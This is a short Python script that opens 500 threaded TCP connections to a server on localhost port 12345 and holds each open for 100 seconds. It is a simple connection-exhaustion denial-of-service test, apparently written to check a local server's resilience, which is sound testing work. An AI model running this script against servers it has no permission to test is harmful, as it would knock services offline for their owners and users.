import socket
import threading
import time

HOST = '127.0.0.1'
PORT = 12345
NUM_CONNECTIONS = 500


def attack():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        time.sleep(100)
    except Exception as e:
        print(f"[ERROR] {e}")


threads = []
for _ in range(NUM_CONNECTIONS):
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
